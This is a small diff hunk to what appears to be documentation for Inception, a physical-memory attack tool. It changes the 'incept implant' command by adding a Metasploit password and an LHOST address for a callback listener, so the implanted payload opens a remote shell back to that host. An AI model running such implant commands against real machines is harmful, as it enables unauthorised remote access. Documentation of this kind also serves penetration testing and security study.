@@ -236,7 +236,7 @@ if something should go awry:
 
 Then, in another terminal, we launch Inception:
 
-    incept implant --msfpw password
+    incept implant --msfpw password --msfopts LHOST=172.16.1.1
 
 TODO: Insert output
 
